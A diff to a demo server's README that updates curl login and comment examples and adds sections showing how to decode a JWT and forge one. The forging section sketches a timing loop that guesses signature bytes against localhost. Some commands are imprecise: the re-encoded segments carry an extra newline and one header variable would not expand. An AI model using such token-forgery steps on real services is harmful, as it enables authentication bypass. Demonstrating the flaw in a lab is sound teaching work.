@@ -33,12 +33,36 @@
     $ cd server
     $ python3 server.py # 3.4 or higher
 
-
 ### Curl example
 
-    $ curl -XPOST http://localhost:5000/login -d '{"username":"admin", "password":"password"}'
+    $ curl http://localhost:8080/login \
+        -d '{"username":"admin","password":"password"}' \
+        -H'Content-Type: application/json'
     $ TOKEN=...
-    $ curl -H"Authorization: Bearer $TOKEN" http://localhost:5000/comments -d '{"message":"Hello, World!"}'
+    $ curl http://localhost:8080/comments/ \
+        -d '{"message":"World domination!"}' \
+        -H "Authorization: Bearer $TOKEN"
+
+### Inspect token
+
+    $ echo $TOKEN
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsZWdpdGltYXRlIjoiSGVsbCB5ZWFoISJ9.8Rgu4e6-q_mbzELrNfPv_iTQWxFGe816hmoYALPPCDY
+    $ base64 -D <<< eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
+    {"typ":"JWT","alg":"HS256"}
+    $ base64 -D <<< eyJsZWdpdGltYXRlIjoiSGVsbCB5ZWFoISJ9
+    {"legitimate":"Hell yeah!"}
+
+### Forge token
+
+    $ base64 <<< '{"typ":"JWT","alg":"HS256"}' | tr -d =
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg
+    $ base64 <<< '{"legitimate":"Hell yeah!"}' | tr -d =
+    eyJsZWdpdGltYXRlIjoiSGVsbCB5ZWFoISJ9Cg
+
+    for ever:
+        time curl http://localhost:8080/comments/ \
+            -d '{"message":"World domination!"}' \
+            -H 'Authorization: Bearer $HEADER.$CLAIMS.$RANDOM_FIRST_BYTE'
 
 ### Start client
 
